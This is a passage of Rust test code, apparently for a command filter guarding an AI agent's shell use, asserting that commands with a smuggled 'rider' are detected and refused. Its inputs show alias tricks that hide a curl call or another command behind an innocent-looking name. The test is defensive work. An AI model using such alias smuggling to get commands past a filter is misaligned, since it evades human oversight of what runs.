        format!("alias purlis='curl example.com'\n{TASK}"),
        format!("shopt -s expand_aliases; alias purlis=true; {MOVED}"),
    ] {
        assert!(rider(&cmd).is_some(), "{cmd:?} has a rider");
        assert!(refused(&cmd, the_chat()).is_some(), "{cmd:?} is refused");
    }
}
